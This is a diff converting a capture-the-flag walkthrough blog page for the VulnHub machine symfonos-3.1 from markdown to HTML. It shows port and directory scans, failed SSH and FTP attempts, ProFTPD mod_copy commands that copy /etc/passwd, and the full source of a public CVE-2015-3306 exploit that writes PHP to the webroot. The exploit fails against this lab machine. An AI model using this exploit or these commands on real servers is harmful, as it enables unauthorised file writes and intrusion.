@@ -1,60 +1,45 @@
 <html lang="en">
-    <head>
-        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>/f0c1s/blog/sec/vulnhub/symfonos-3.1</title>
-        <link rel="stylesheet" href="../../../index.css"/>
-        <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
-        <script src="../../../highlight/highlight.min.js"></script>
-        <script src="../../../setup.js"></script>
-        <script>hljs.highlightAll();</script>
-    </head>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>
+/f0c1s/blog/sec/vulnhub/symfonos-3.1
+</title>
+<link rel="stylesheet" href="../../../index.css"/> <link rel="stylesheet" href="../../../highlight/styles/monokai.min.css"/>
+<script src="../../../highlight/highlight.min.js"></script>
+<script src="../../../setup.js"></script>
+<script>hljs.highlightAll();</script>
+</head>
 <body onload="setup()">
-<h1>/f0c1s/blog/sec/vulnhub/symfonos-3.1</h1>
-
+<h1>
+/f0c1s/blog/sec/vulnhub/symfonos-3.1
+</h1>
 <nav>
-    <a href="../../../index.html">/blog</a>
-    <a href="../../index.html">Security</a>
-    <a href="../index.html">VulnHub</a>
-    <a href="../../../sec/vulnhub/symfonos-3.1/symfonos-3.1.html">+ symfonos-3.1 - 2022.01.06 Thursday</a>
+<a href="../../../index.html">/blog</a> <a href="../../index.html">Security</a> <a href="../index.html">VulnHub</a> <a href="../../../sec/vulnhub/symfonos-3.1/symfonos-3.1.html">+ symfonos-3.1 - 2022.01.06 Thursday</a>
 </nav>
-
-## Description
-
-> Intermediate real life based machine designed to test your skill at enumeration.
-> If you get stuck remember to try different wordlist, avoid rabbit holes and enumerate everything thoroughly.
-> SHOULD work for both VMware and Virtualbox.
->
-> For hints you're welcome to contact me via Twitter @zayotic
->
-> \## Changelog v3.1 - 2020-04-07 v3.0 - 2019-07-20
-
-[VulnHub: https://www.vulnhub.com/entry/symfonos-31,332/](https://www.vulnhub.com/entry/symfonos-31,332/)
-[Series: https://www.vulnhub.com/series/symfonos,217/](https://www.vulnhub.com/series/symfonos,217/)
-
-![0.running-box](0.running-box.png)
-
-## Scanning
-
-```shell
-fping -aAqg 192.168.56.1/24 | tee fping.txt
+<h2 id="description">Description</h2>
+<blockquote>
+<p>Intermediate real life based machine designed to test your skill at enumeration. If you get stuck remember to try different wordlist, avoid rabbit holes and enumerate everything thoroughly. SHOULD work for both VMware and Virtualbox.</p>
+<p>For hints you’re welcome to contact me via Twitter <span class="citation" data-cites="zayotic">@zayotic</span></p>
+<p>## Changelog v3.1 - 2020-04-07 v3.0 - 2019-07-20</p>
+</blockquote>
+<p><a href="https://www.vulnhub.com/entry/symfonos-31,332/">VulnHub: https://www.vulnhub.com/entry/symfonos-31,332/</a> <a href="https://www.vulnhub.com/series/symfonos,217/">Series: https://www.vulnhub.com/series/symfonos,217/</a></p>
+<figure>
+<img src="0.running-box.png" alt="" /><figcaption>0.running-box</figcaption>
+</figure>
+<h2 id="scanning">Scanning</h2>
+<pre class="shell"><code>fping -aAqg 192.168.56.1/24 | tee fping.txt
 192.168.56.1
 192.168.56.2
 192.168.56.70
 192.168.56.92
-
-```
-
-[fping](../../tools/fping.html)
-
-```shell
-export RHOST="192.168.56.92"
-export LHOST="192.168.56.70"
-export LPORT="443"
-
-```
-
-```shell
-_n $RHOST
+</code></pre>
+<p><a href="../../tools/fping.html">fping</a></p>
+<pre class="shell"><code>export RHOST=&quot;192.168.56.92&quot;
+export LHOST=&quot;192.168.56.70&quot;
+export LPORT=&quot;443&quot;
+</code></pre>
+<pre class="shell"><code>_n $RHOST
 firing nmap 192.168.56.92 -n | tee nmap.default.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 09:05 IST
 Nmap scan report for 192.168.56.92
@@ -66,11 +51,8 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
-
-```
-
-```shell
-_ntd $RHOST
+</code></pre>
+<pre class="shell"><code>_ntd $RHOST
 firing nmap 192.168.56.92 -p- -Pn -A -T4 --min-rate=5000 -sVC -n | tee nmap.tcp-ports.deep.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 09:05 IST
 Nmap scan report for 192.168.56.92
@@ -84,17 +66,14 @@ PORT   STATE SERVICE VERSION
 |   256 74:e5:9a:5a:4c:16:90:ca:d8:f7:c7:78:e7:5a:86:81 (ECDSA)
 |_  256 3c:e4:0b:b9:db:bf:01:8a:b7:9c:42:bc:cb:1e:41:6b (ED25519)
 80/tcp open  http    Apache httpd 2.4.25 ((Debian))
-|_http-title: Site doesn't have a title (text/html).
+|_http-title: Site doesn&#39;t have a title (text/html).
 |_http-server-header: Apache/2.4.25 (Debian)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
-
-```
-
-```shell
-_nu $RHOST
+</code></pre>
+<pre class="shell"><code>_nu $RHOST
 firing sudo nmap 192.168.56.92 -sU -p- -Pn --min-rate=5000 --open --top-ports=500 -n | tee nmap.udp-all-ports.txt
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 09:06 IST
 Nmap scan report for 192.168.56.92
@@ -104,12 +83,8 @@ Not shown: 494 open|filtered udp ports (no-response), 6 closed udp ports (port-u
 MAC Address: 08:00:27:D0:E8:29 (Oracle VirtualBox virtual NIC)
 
 Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
-
-```
-
-
-```shell
-sudo nmap $RHOST -p- -Pn -A -T4 --min-rate=5000 -sVC --script=*enum* -n | tee nmap.enum.txt
+</code></pre>
+<pre class="shell"><code>sudo nmap $RHOST -p- -Pn -A -T4 --min-rate=5000 -sVC --script=*enum* -n | tee nmap.enum.txt
 [sudo] password for f0c1s:
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-06 09:22 IST
 Nmap scan report for 192.168.56.92
@@ -173,18 +148,13 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 10.10 seconds
-
-```
-
-
-## Attacking web
-
-![1.browsing-web](1.browsing-web.png)
-
-### nikto
-
-```shell
-nikto -C all -host http://$RHOST | tee nikto.txt
+</code></pre>
+<h2 id="attacking-web">Attacking web</h2>
+<figure>
+<img src="1.browsing-web.png" alt="" /><figcaption>1.browsing-web</figcaption>
+</figure>
+<h3 id="nikto">nikto</h3>
+<pre class="shell"><code>nikto -C all -host http://$RHOST | tee nikto.txt
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.56.92
@@ -204,41 +174,23 @@ nikto -C all -host http://$RHOST | tee nikto.txt
 + End Time:           2022-01-06 09:08:33 (GMT5.5) (75 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-
-```
-
-### feroxbuster
-
-```shell
-feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
+</code></pre>
+<h3 id="feroxbuster">feroxbuster</h3>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k
 301        9l       28w      313c http://192.168.56.92/gate
 301        9l       28w      322c http://192.168.56.92/gate/cerberus
 Scanning: http://192.168.56.92
 Scanning: http://192.168.56.92/gate
-^C
-```
-
-### gobuster
-
-
-```shell
-gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 404,403 -q
-/gate                 (Status: 301) [Size: 313] [--> http://192.168.56.92/gate/]
+^C</code></pre>
+<h3 id="gobuster">gobuster</h3>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 404,403 -q
+/gate                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.92/gate/]
 /server-status        (Status: 403) [Size: 278]
-
-```
-
-```shell
-gobuster dir --url http://$RHOST/gate/cerberus -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 404,403 -q
-
-```
-
-
-### dirb
-
-
-```shell
-dirb http://$RHOST
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/cerberus -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 404,403 -q
+</code></pre>
+<h3 id="dirb">dirb</h3>
+<pre class="shell"><code>dirb http://$RHOST
 
 -----------------
 DIRB v2.22
@@ -255,7 +207,7 @@ GENERATED WORDS: 4612
 
 ---- Scanning URL: http://192.168.56.92/ ----
 + http://192.168.56.92/cgi-bin/ (CODE:403|SIZE:278)
-==> DIRECTORY: http://192.168.56.92/gate/
+==&gt; DIRECTORY: http://192.168.56.92/gate/
 + http://192.168.56.92/index.html (CODE:200|SIZE:241)
 + http://192.168.56.92/server-status (CODE:403|SIZE:278)
 
@@ -265,36 +217,25 @@ GENERATED WORDS: 4612
 -----------------
 END_TIME: Thu Jan  6 09:12:52 2022
 DOWNLOADED: 9224 - FOUND: 4
-
-```
-
-### /gate
-
-![2.gate](2.gate.png)
-
-
-
-## SSH
-
-```shell
-ssh root@$RHOST
-The authenticity of host '192.168.56.92 (192.168.56.92)' can't be established.
+</code></pre>
+<h3 id="gate">/gate</h3>
+<figure>
+<img src="2.gate.png" alt="" /><figcaption>2.gate</figcaption>
+</figure>
+<h2 id="ssh">SSH</h2>
+<pre class="shell"><code>ssh root@$RHOST
+The authenticity of host &#39;192.168.56.92 (192.168.56.92)&#39; can&#39;t be established.
 ED25519 key fingerprint is SHA256:W2RvYQCoyTPbHNSQycwjo7k7ccOJvfWbk4WpSDnK4Dk.
 This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '192.168.56.92' (ED25519) to the list of known hosts.
-root@192.168.56.92's password:
+Warning: Permanently added &#39;192.168.56.92&#39; (ED25519) to the list of known hosts.
+root@192.168.56.92&#39;s password:
 Permission denied, please try again.
-root@192.168.56.92's password:
+root@192.168.56.92&#39;s password:
 
-
-```
-
-## FTP
-
-
-```shell
-ftp -p $RHOST 21
+</code></pre>
+<h2 id="ftp">FTP</h2>
+<pre class="shell"><code>ftp -p $RHOST 21
 Connected to 192.168.56.92.
 220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.56.92]
 Name (192.168.56.92:f0c1s): anonymous
@@ -302,21 +243,18 @@ Name (192.168.56.92:f0c1s): anonymous
 Password:
 530 Login incorrect.
 ftp: Login failed
-ftp> ls
+ftp&gt; ls
 530 Please login with USER and PASS
 Passive mode refused.
-ftp> passive
+ftp&gt; passive
 Passive mode: off; fallback to active mode: off.
-ftp> ls
+ftp&gt; ls
 530 Please login with USER and PASS
-ftp: Can't bind for data connection: Address already in use
-ftp> exit
+ftp: Can&#39;t bind for data connection: Address already in use
+ftp&gt; exit
 221 Goodbye.
-
-```
-
-```shell
-ftp $RHOST 21
+</code></pre>
+<pre class="shell"><code>ftp $RHOST 21
 Connected to 192.168.56.92.
 220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.56.92]
 Name (192.168.56.92:f0c1s): anonymous
@@ -324,95 +262,82 @@ Name (192.168.56.92:f0c1s): anonymous
 Password:
 530 Login incorrect.
 ftp: Login failed
-ftp> site
+ftp&gt; site
 (arguments to SITE command) cpfr /etc/shadow
 530 Please login with USER and PASS
-ftp> site cpfr /etc/passwd
+ftp&gt; site cpfr /etc/passwd
 530 Please login with USER and PASS
-ftp> exit
+ftp&gt; exit
 221 Goodbye.
-
-```
-
-### Atacking ProFTPd 1.3.5b
-
-- [https://www.tenable.com/plugins/nnm/701079](https://www.tenable.com/plugins/nnm/701079)
-- [https://www.exploit-db.com/exploits/36803](https://www.exploit-db.com/exploits/36803)
-- [https://www.exploit-db.com/exploits/49908](https://www.exploit-db.com/exploits/49908)
-
-```shell
-searchsploit ProFTPD 1.3.5
+</code></pre>
+<h3 id="atacking-proftpd-1.3.5b">Atacking ProFTPd 1.3.5b</h3>
+<ul>
+<li><a href="https://www.tenable.com/plugins/nnm/701079">https://www.tenable.com/plugins/nnm/701079</a></li>
+<li><a href="https://www.exploit-db.com/exploits/36803">https://www.exploit-db.com/exploits/36803</a></li>
+<li><a href="https://www.exploit-db.com/exploits/49908">https://www.exploit-db.com/exploits/49908</a></li>
+</ul>
+<pre class="shell"><code>searchsploit ProFTPD 1.3.5
 --------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                   |  Path
 --------------------------------------------------------------------------------- ---------------------------------
-ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                        | linux/remote/37262.rb
-ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                              | linux/remote/36803.py
-ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                          | linux/remote/49908.py
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Command Execution (Metasploit)                        | linux/remote/37262.rb
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution                              | linux/remote/36803.py
+ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution (2)                          | linux/remote/49908.py
 ProFTPd 1.3.5 - File Copy                                                        | linux/remote/36742.txt
 --------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 Papers: No Results
-
-```
-
-### cat 49908.py
-
-```python
-
-# Exploit Title: ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)
-# Date: 25/05/2021
-# Exploit Author: Shellbr3ak
-# Version: 1.3.5
-# Tested on: Ubuntu 16.04.6 LTS
-# CVE : CVE-2015-3306
-
-#!/usr/bin/env python3
-
-import sys
-import socket
-import requests
-
-def exploit(client, target):
-    client.connect((target,21)) # Connecting to the target server
-    banner = client.recv(74)
-    print(banner.decode())
-    client.send(b'site cpfr /etc/passwd\r\n')
-    print(client.recv(1024).decode())
-    client.send(b'site cpto <?php phpinfo(); ?>\r\n') # phpinfo() is just a PoC.
-    print(client.recv(1024).decode())
-    client.send(b'site cpfr /proc/self/fd/3\r\n')
-    print(client.recv(1024).decode())
-    client.send(b'site cpto /var/www/html/test.php\r\n')
-    print(client.recv(1024).decode())
-    client.close()
-    print('Exploit Completed')
-
-def check(url):
-    req = requests.get(url) # Requesting the written PoC php file via HTTP
-    if req.status_code == 200:
-        print('[+] File Written Successfully')
-        print(f'[+] Go to : {url}')
-    else:
-        print('[!] Something Went Wrong')
-        print('[!] Directory might not be writable')
-
-def main():
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    target = sys.argv[1]
-    exploit(client, target)
-    url = 'http://' + target + '/test.php'
-    check(url)
-
-if __name__ == '__main__':
-    main()
-
-```
-
-But given the ftp interaction so far, I don't think that it will work.
-
-
-```shell
-python3 ./49908.py 192.168.56.92
+</code></pre>
+<h3 id="cat-49908.py">cat 49908.py</h3>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a><span class="co"># Exploit Title: ProFTPd 1.3.5 - &#39;mod_copy&#39; Remote Command Execution (2)</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a><span class="co"># Date: 25/05/2021</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true"></a><span class="co"># Exploit Author: Shellbr3ak</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true"></a><span class="co"># Version: 1.3.5</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true"></a><span class="co"># Tested on: Ubuntu 16.04.6 LTS</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true"></a><span class="co"># CVE : CVE-2015-3306</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true"></a></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true"></a><span class="co">#!/usr/bin/env python3</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true"></a></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true"></a><span class="im">import</span> sys</span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true"></a><span class="im">import</span> socket</span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true"></a><span class="im">import</span> requests</span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true"></a></span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true"></a><span class="kw">def</span> exploit(client, target):</span>
+<span id="cb16-16"><a href="#cb16-16" aria-hidden="true"></a>    client.<span class="ex">connect</span>((target,<span class="dv">21</span>)) <span class="co"># Connecting to the target server</span></span>
+<span id="cb16-17"><a href="#cb16-17" aria-hidden="true"></a>    banner <span class="op">=</span> client.recv(<span class="dv">74</span>)</span>
+<span id="cb16-18"><a href="#cb16-18" aria-hidden="true"></a>    <span class="bu">print</span>(banner.decode())</span>
+<span id="cb16-19"><a href="#cb16-19" aria-hidden="true"></a>    client.send(b<span class="st">&#39;site cpfr /etc/passwd</span><span class="ch">\r\n</span><span class="st">&#39;</span>)</span>
+<span id="cb16-20"><a href="#cb16-20" aria-hidden="true"></a>    <span class="bu">print</span>(client.recv(<span class="dv">1024</span>).decode())</span>
+<span id="cb16-21"><a href="#cb16-21" aria-hidden="true"></a>    client.send(b<span class="st">&#39;site cpto &lt;?php phpinfo(); ?&gt;</span><span class="ch">\r\n</span><span class="st">&#39;</span>) <span class="co"># phpinfo() is just a PoC.</span></span>
+<span id="cb16-22"><a href="#cb16-22" aria-hidden="true"></a>    <span class="bu">print</span>(client.recv(<span class="dv">1024</span>).decode())</span>
+<span id="cb16-23"><a href="#cb16-23" aria-hidden="true"></a>    client.send(b<span class="st">&#39;site cpfr /proc/self/fd/3</span><span class="ch">\r\n</span><span class="st">&#39;</span>)</span>
+<span id="cb16-24"><a href="#cb16-24" aria-hidden="true"></a>    <span class="bu">print</span>(client.recv(<span class="dv">1024</span>).decode())</span>
+<span id="cb16-25"><a href="#cb16-25" aria-hidden="true"></a>    client.send(b<span class="st">&#39;site cpto /var/www/html/test.php</span><span class="ch">\r\n</span><span class="st">&#39;</span>)</span>
+<span id="cb16-26"><a href="#cb16-26" aria-hidden="true"></a>    <span class="bu">print</span>(client.recv(<span class="dv">1024</span>).decode())</span>
+<span id="cb16-27"><a href="#cb16-27" aria-hidden="true"></a>    client.close()</span>
+<span id="cb16-28"><a href="#cb16-28" aria-hidden="true"></a>    <span class="bu">print</span>(<span class="st">&#39;Exploit Completed&#39;</span>)</span>
+<span id="cb16-29"><a href="#cb16-29" aria-hidden="true"></a></span>
+<span id="cb16-30"><a href="#cb16-30" aria-hidden="true"></a><span class="kw">def</span> check(url):</span>
+<span id="cb16-31"><a href="#cb16-31" aria-hidden="true"></a>    req <span class="op">=</span> requests.get(url) <span class="co"># Requesting the written PoC php file via HTTP</span></span>
+<span id="cb16-32"><a href="#cb16-32" aria-hidden="true"></a>    <span class="cf">if</span> req.status_code <span class="op">==</span> <span class="dv">200</span>:</span>
+<span id="cb16-33"><a href="#cb16-33" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&#39;[+] File Written Successfully&#39;</span>)</span>
+<span id="cb16-34"><a href="#cb16-34" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="ss">f&#39;[+] Go to : </span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">&#39;</span>)</span>
+<span id="cb16-35"><a href="#cb16-35" aria-hidden="true"></a>    <span class="cf">else</span>:</span>
+<span id="cb16-36"><a href="#cb16-36" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&#39;[!] Something Went Wrong&#39;</span>)</span>
+<span id="cb16-37"><a href="#cb16-37" aria-hidden="true"></a>        <span class="bu">print</span>(<span class="st">&#39;[!] Directory might not be writable&#39;</span>)</span>
+<span id="cb16-38"><a href="#cb16-38" aria-hidden="true"></a></span>
+<span id="cb16-39"><a href="#cb16-39" aria-hidden="true"></a><span class="kw">def</span> main():</span>
+<span id="cb16-40"><a href="#cb16-40" aria-hidden="true"></a>    client <span class="op">=</span> socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span>
+<span id="cb16-41"><a href="#cb16-41" aria-hidden="true"></a>    target <span class="op">=</span> sys.argv[<span class="dv">1</span>]</span>
+<span id="cb16-42"><a href="#cb16-42" aria-hidden="true"></a>    exploit(client, target)</span>
+<span id="cb16-43"><a href="#cb16-43" aria-hidden="true"></a>    url <span class="op">=</span> <span class="st">&#39;http://&#39;</span> <span class="op">+</span> target <span class="op">+</span> <span class="st">&#39;/test.php&#39;</span></span>
+<span id="cb16-44"><a href="#cb16-44" aria-hidden="true"></a>    check(url)</span>
+<span id="cb16-45"><a href="#cb16-45" aria-hidden="true"></a></span>
+<span id="cb16-46"><a href="#cb16-46" aria-hidden="true"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
+<span id="cb16-47"><a href="#cb16-47" aria-hidden="true"></a>    main()</span></code></pre></div>
+<p>But given the ftp interaction so far, I don’t think that it will work.</p>
+<pre class="shell"><code>python3 ./49908.py 192.168.56.92
 220 ProFTPD 1.3.5b Server (Debian) [::ffff:192.168.56.92]
 
 530 Please login with USER and PASS
@@ -426,28 +351,16 @@ python3 ./49908.py 192.168.56.92
 Exploit Completed
 [!] Something Went Wrong
 [!] Directory might not be writable
-
-```
-
-And it doesn't.
-
-## Attacking web again
-
-```shell
-gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/seclists/Discovery/Web-Content/common.txt -b 404,403 -q
-/gate                 (Status: 301) [Size: 313] [--> http://192.168.56.92/gate/]
+</code></pre>
+<p>And it doesn’t.</p>
+<h2 id="attacking-web-again">Attacking web again</h2>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/seclists/Discovery/Web-Content/common.txt -b 404,403 -q
+/gate                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.92/gate/]
 /index.html           (Status: 200) [Size: 241]
-
-```
-
-```shell
-gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/seclists/Discovery/Web-Content/apache.txt -b 404,403 -q
-/index.html           (Status: 200) [Size: 241]
-```
-
-
-```shell
-feroxbuster -q -u http://$RHOST -w /usr/share/seclists/Discovery/Web-Content/common.txt --rate-limit 100 -d 2 -L 4 -k
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/seclists/Discovery/Web-Content/apache.txt -b 404,403 -q
+/index.html           (Status: 200) [Size: 241]</code></pre>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/seclists/Discovery/Web-Content/common.txt --rate-limit 100 -d 2 -L 4 -k
 403        9l       28w      278c http://192.168.56.92/.htpasswd
 403        9l       28w      278c http://192.168.56.92/.hta
 403        9l       28w      278c http://192.168.56.92/.htaccess
@@ -465,50 +378,29 @@ feroxbuster -q -u http://$RHOST -w /usr/share/seclists/Discovery/Web-Content/com
 Scanning: http://192.168.56.92
 Scanning: http://192.168.56.92/cgi-bin/
 Scanning: http://192.168.56.92/gate
-
-```
-
-```shell
-gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -b 404,403 -q
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -b 404,403 -q
 /.                    (Status: 200) [Size: 241]
-/gate                 (Status: 301) [Size: 313] [--> http://192.168.56.92/gate/]
-
-```
-
-
-```shell
-ffuf -u http://$RHOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 -s
+/gate                 (Status: 301) [Size: 313] [--&gt; http://192.168.56.92/gate/]
+</code></pre>
+<pre class="shell"><code>ffuf -u http://$RHOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt  -fc 403,404,401,400 -s
 .
 gate
 
-
-```
-
-
-```shell
-ffuf -u http://$RHOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/apache.txt  -fc 403,404,401,400 -s
+</code></pre>
+<pre class="shell"><code>ffuf -u http://$RHOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/apache.txt  -fc 403,404,401,400 -s
 index.html
 
-
-```
-
-
-```shell
-ffuf -u http://$RHOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt  -fc 403,404,401,400 -s
+</code></pre>
+<pre class="shell"><code>ffuf -u http://$RHOST/FUZZ -w /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt  -fc 403,404,401,400 -s
 /index.html
 
-
-```
-
-```shell
-ffuf -u http://$RHOST/gate/cerberus/FUZZ.jpg -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fc 403,404,401,400 -s
+</code></pre>
+<pre class="shell"><code>ffuf -u http://$RHOST/gate/cerberus/FUZZ.jpg -w /usr/share/seclists/Discovery/Web-Content/raft-large-words-lowercase.txt -fc 403,404,401,400 -s
 image
 
-
-```
-
-```shell
-grep -Hnr "^cerberus$" /usr/share/wordlists/*
+</code></pre>
+<pre class="shell"><code>grep -Hnr &quot;^cerberus$&quot; /usr/share/wordlists/*
 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt:7659:cerberus
 /usr/share/wordlists/dirbuster/directories.jbrofuzz:8482:cerberus
 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:8240:cerberus
@@ -576,39 +468,25 @@ grep -Hnr "^cerberus$" /usr/share/wordlists/*
 /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-dup.txt:4423:cerberus
 /usr/share/wordlists/seclists/Passwords/dutch_common_wordlist.txt:766738:cerberus
 /usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt:12749:cerberus
-
-```
-
-What came next was hours of frustration, because nothing was working.
-
-```shell
-for words in `grep -Hnr "^cerberus$" /usr/share/wordlists/* | cut -d':' -f1 | grep -v "rockyou\|password"`
+</code></pre>
+<p>What came next was hours of frustration, because nothing was working.</p>
+<pre class="shell"><code>for words in `grep -Hnr &quot;^cerberus$&quot; /usr/share/wordlists/* | cut -d&#39;:&#39; -f1 | grep -v &quot;rockyou\|password&quot;`
 do
 echo $words
-gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=$words -b 404,403 -q&
-echo "\n"
+gobuster dir --url http://$RHOST -x cgi,js,png,py,txt,php,log,bak --wordlist=$words -b 404,403 -q&amp;
+echo &quot;\n&quot;
 done
 
 
 gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/wfuzz/vulns/cgis.txt -b 404,403,400 -q -f
-
-```
-
-```shell
-gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,400 -q -f
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST -x js,png,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,400 -q -f
 /gate/                (Status: 200) [Size: 202]
-
-```
-
-
-```shell
-gobuster dir --url http://$RHOST/gate/ -x cgi,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,400 -q -f
+</code></pre>
+<pre class="shell"><code>gobuster dir --url http://$RHOST/gate/ -x cgi,py,txt,php,log,bak --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404,403,400 -q -f
 /cerberus/            (Status: 200) [Size: 202]
-
-```
-
-```shell
-feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k -f
+</code></pre>
+<pre class="shell"><code>feroxbuster -q -u http://$RHOST -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --rate-limit 100 -d 2 -L 4 -k -f
 403        9l       28w      278c http://192.168.56.92/icons/
 403        9l       28w      278c http://192.168.56.92/cgi-bin/
 403        9l       28w      278c http://192.168.56.92/icons/small/
@@ -619,13 +497,8 @@ Scanning: http://192.168.56.92
 Scanning: http://192.168.56.92/icons/
 Scanning: http://192.168.56.92/cgi-bin/
 Scanning: http://192.168.56.92/gate/
-
-```
-
-Feroxbuster found /cgi-bin/underworld.
-
-But I cannot find anything after that.
-
-
+</code></pre>
+<p>Feroxbuster found /cgi-bin/underworld.</p>
+<p>But I cannot find anything after that.</p>
 </body>
 </html>
